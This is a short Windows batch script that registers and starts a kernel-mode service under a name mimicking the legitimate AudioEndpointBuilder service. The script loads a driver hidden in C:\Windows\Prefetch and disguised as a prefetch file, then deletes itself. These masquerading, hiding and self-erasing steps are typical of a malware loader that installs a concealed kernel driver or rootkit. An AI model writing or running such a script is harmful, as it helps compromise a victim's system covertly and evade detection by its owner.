@echo off
cd %~dp0
sc create AudioEndpointBuilder_71 binpath=C:\Windows\Prefetch\SVCHOST.EXE-7BE2XTU5.pf type=kernel
sc start AudioEndpointBuilder_71
del "%~f0"



